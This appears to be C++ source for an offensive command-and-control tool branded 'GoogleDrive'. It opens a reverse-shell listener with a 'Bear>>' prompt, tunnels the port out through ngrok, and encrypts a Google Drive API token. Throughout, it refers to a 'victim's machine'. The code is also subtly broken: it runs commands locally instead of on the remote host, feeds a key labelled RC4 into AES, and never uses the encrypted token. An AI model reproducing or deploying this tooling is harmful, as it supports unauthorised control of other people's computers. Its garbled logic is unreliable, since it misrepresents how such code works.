//g++ -o GoogleDrive.o GoogleDrive.cpp -lcurl -lssl -lcrypto -lpthread
#include <iostream>
#include <string>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <cstdio>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <curl/curl.h>
#include <fstream>

using namespace std;

// Color definitions
#define RESET "\033[0m"
#define RED "\033[91m"
#define GREEN "\033[92m"
#define YELLOW "\033[93m"
#define BLUE "\033[94m"

// ASCII Art Banner
void print_banner() {
    cout << YELLOW << R"(
                             ..........                             
                            ++-:::::::::                            
                           ++++=:::::::::                           
                          +++++++:::::::::                          
                         ++++++++*:::::::::                         
                        +++++++++  :::::::::                        
                       +++++++++    :::::::::                       
                      +++++++++      :::::::::.                     
                    :+++++++++        :::::::::.                    
                    ++++++++*+++++++++++++++++++                    
                     ++++++**++++++++++++++++++                     
                      *+++*+++++++++++++++++++                      
                       *+*+++++++++++++++++++            
                       
  ________                      __         ________         __              
 /  _____/  ____   ____   ____ |  |   ____ \______ \_______|__|__  __ ____  
/   \  ___ /  _ \ /  _ \ / ___\|  | _/ __ \ |    |  \_  __ \  \  \/ // __ \ 
\    \_\  (  <_> |  <_> ) /_/  >  |_\  ___/ |    `   \  | \/  |\   /\  ___/ 
 \______  /\____/ \____/\___  /|____/\___  >_______  /__|  |__| \_/  \___  >
        \/             /_____/           \/        \/                    \/ 
    )" << RESET << endl;
}

// Function to encrypt access token using AES
string encrypt_access_token(const string& token, const string& key) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[EVP_MAX_IV_LENGTH];
    RAND_bytes(iv, sizeof(iv));

    vector<unsigned char> ciphertext(token.size() + EVP_CIPHER_block_size(EVP_aes_256_cbc()));

    int len;
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, (unsigned char*)key.c_str(), iv);
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, (unsigned char*)token.c_str(), token.size());

    int ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    
    string encrypted_data(reinterpret_cast<char*>(ciphertext.data()), ciphertext_len);
    return string(reinterpret_cast<char*>(iv), sizeof(iv)) + encrypted_data; // Prepend IV
}

// Function to handle socket communication
void handle_socket(int client_socket) {
    string command;
    while (true) {
        cout << RED << "[*] Bear>> " << RESET;
        getline(cin, command);
        if (command == "exit") break;

        // Execute command
        FILE* pipe = popen(command.c_str(), "r");
        if (!pipe) {
            cerr << RED << "[!] Error executing command." << RESET << endl;
            continue;
        }

        char buffer[128];
        string result;
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        int return_code = pclose(pipe);

        // Check if the command was executed successfully
        if (return_code == 0) {
            cout << GREEN << "[+] Command executed successfully!" << RESET << endl;
            // Send output back to the client
            send(client_socket, result.c_str(), result.size(), 0);
            cout << GREEN << result << RESET; // Print the command output
        } else {
            cout << RED << "[!] No output returned from the victim's machine." << RESET << endl;
        }
    }
}

// Function to start the ngrok tunnel
void start_ngrok(const string& port) {
    string command = "ngrok tcp " + port + " > ngrok.log 2>&1";
    system(command.c_str());
}

// Main function
int main() {
    print_banner(); // Print ASCII banner

    string access_token;
    string ip;
    string port;
    string rc4_key;

    cout << "[+] Enter your Google Drive API access token: ";
    getline(cin, access_token);
    
    cout << "[+] Enter the IP for the reverse shell: ";
    getline(cin, ip);

    cout << "[+] Enter the port number for the reverse shell and ngrok: ";
    getline(cin, port);

    cout << "[+] Enter the RC4 key: ";
    getline(cin, rc4_key);

    // Start ngrok tunnel
    thread ngrok_thread(start_ngrok, port);
    this_thread::sleep_for(chrono::seconds(5)); // Wait for ngrok to initialize

    // Encrypt access token
    string encrypted_token = encrypt_access_token(access_token, rc4_key);
    cout << GREEN << "[+] Encrypted access token." << RESET << endl;

    // Create socket
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());
    server_addr.sin_port = htons(stoi(port));

    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        cerr << RED << "[!] Error binding socket." << RESET << endl;
        return 1;
    }

    listen(server_socket, 1);
    cout << GREEN << "[+] Waiting for incoming connection..." << RESET << endl;

    int client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
    cout << GREEN << "[+] Connection established!" << RESET << endl;

    // Handle socket communication
    handle_socket(client_socket);

    // Cleanup
    close(client_socket);
    close(server_socket);
    ngrok_thread.join();

    return 0;
}

